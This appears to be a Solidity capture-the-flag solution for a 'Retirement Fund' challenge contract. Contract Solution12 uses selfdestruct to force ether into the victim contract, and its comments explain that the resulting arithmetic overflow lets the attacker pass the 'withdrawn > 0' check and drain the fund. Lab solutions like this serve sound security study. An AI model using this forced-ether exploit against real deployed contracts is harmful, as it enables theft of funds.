// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.21;

import "./RetirementFundChallenge.sol";

//selfdestruct sends remaining contract balance to address argument.
//Target contract balance can be unexpectedly updated with selfdestruct payable trick
//Exploit here - use overflow to pass 'require(withdrawn > 0)' state

contract Solution12 {
    RetirementFundChallenge public victim;

    function Solution12() public {

    }

    function setVictim(RetirementFundChallenge victim_) external {
        victim = victim_;
    }

    function attack() external payable {
        selfdestruct(address(victim));
    }
}
